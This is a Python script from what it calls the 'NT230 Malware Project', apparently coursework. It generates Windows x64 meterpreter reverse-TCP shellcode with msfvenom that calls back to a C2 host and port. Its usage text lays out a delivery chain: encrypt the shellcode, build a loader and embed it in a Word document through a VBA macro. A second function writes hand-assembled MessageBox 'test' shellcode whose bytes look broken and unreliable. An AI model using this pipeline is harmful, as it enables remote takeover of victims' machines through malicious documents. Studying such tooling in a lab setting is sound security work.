"""
Generate Shellcode using msfvenom or manual payload
Tạo reverse shell shellcode để encrypt
"""

import subprocess
import sys
import os

def generate_msfvenom_shellcode(lhost, lport, output_file="shellcode.bin"):
    """
    Tạo shellcode bằng msfvenom (Metasploit)
    
    Args:
        lhost: IP của C2 server
        lport: Port của C2 server
        output_file: File output
    """
    
    print(f"[*] Generating shellcode with msfvenom...")
    print(f"[*] LHOST: {lhost}")
    print(f"[*] LPORT: {lport}")
    
    # Shellcode cho Windows x64 reverse shell
    cmd = [
        "msfvenom",
        "-p", "windows/x64/meterpreter/reverse_tcp",
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", "raw",
        "-o", output_file,
        "--platform", "windows",
        "-a", "x64"
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            file_size = os.path.getsize(output_file)
            print(f"[+] Shellcode generated: {output_file}")
            print(f"[+] Size: {file_size} bytes")
            print()
            print("Next step:")
            print(f"  python loader\\encryptor.py {output_file} BT7.docm")
            return True
        else:
            print(f"[-] Error: {result.stderr}")
            return False
            
    except FileNotFoundError:
        print("[-] msfvenom not found!")
        print("[-] Install Metasploit Framework: https://www.metasploit.com/")
        return False

def generate_simple_shellcode(output_file="shellcode.bin"):
    """
    Tạo simple shellcode để test (calc.exe hoặc message box)
    """
    
    print("[*] Generating test shellcode (MessageBox)...")
    
    # MessageBox shellcode (x64) - "Hello from NT230!"
    # Đây là demo shellcode an toàn để test
    shellcode = bytes([
        0x48, 0x83, 0xEC, 0x28,                         # sub rsp, 0x28
        0x48, 0x31, 0xC9,                               # xor rcx, rcx
        0x48, 0x8D, 0x15, 0x0D, 0x00, 0x00, 0x00,       # lea rdx, [rip+message]
        0x49, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00,       # mov r8, 0
        0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00,       # mov rcx, 0
        0xFF, 0x15, 0x02, 0x00, 0x00, 0x00,             # call [MessageBoxA]
        0xEB, 0x08,                                     # jmp exit
        # MessageBoxA address (placeholder)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        # Message string
        0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x20, 0x66, 0x72,
        0x6F, 0x6D, 0x20, 0x4E, 0x54, 0x32, 0x33, 0x30,
        0x21, 0x00,
        # Exit
        0x48, 0x83, 0xC4, 0x28,                         # add rsp, 0x28
        0xC3                                             # ret
    ])
    
    with open(output_file, 'wb') as f:
        f.write(shellcode)
    
    print(f"[+] Test shellcode generated: {output_file}")
    print(f"[+] Size: {len(shellcode)} bytes")
    print()
    print("Next step:")
    print(f"  python loader\\encryptor.py {output_file} BT7.docm")
    
    return True

def show_usage():
    print("""
╔═══════════════════════════════════════════════════════╗
║     Shellcode Generator - NT230 Malware Project       ║
╚═══════════════════════════════════════════════════════╝

Usage:

1. Generate with Metasploit (requires msfvenom):
   python generate_shellcode.py msfvenom <LHOST> <LPORT>
   
   Example:
   python generate_shellcode.py msfvenom 192.168.1.100 4444

2. Generate test shellcode (MessageBox):
   python generate_shellcode.py test
   
3. Use custom shellcode file:
   - Create shellcode.bin manually
   - Or use other tools (Cobalt Strike, Sliver, etc.)

After generating shellcode:
1. Encrypt it:
   python loader\\encryptor.py shellcode.bin BT7.docm

2. Build loader:
   cd loader
   build.bat

3. Use in Word document with VBA macro
""")

def main():
    if len(sys.argv) < 2:
        show_usage()
        sys.exit(1)
    
    mode = sys.argv[1].lower()
    
    if mode == "msfvenom":
        if len(sys.argv) < 4:
            print("[-] Usage: python generate_shellcode.py msfvenom <LHOST> <LPORT>")
            sys.exit(1)
        
        lhost = sys.argv[2]
        lport = sys.argv[3]
        generate_msfvenom_shellcode(lhost, lport)
        
    elif mode == "test":
        generate_simple_shellcode()
        
    else:
        print(f"[-] Unknown mode: {mode}")
        show_usage()
        sys.exit(1)

if __name__ == "__main__":
    main()
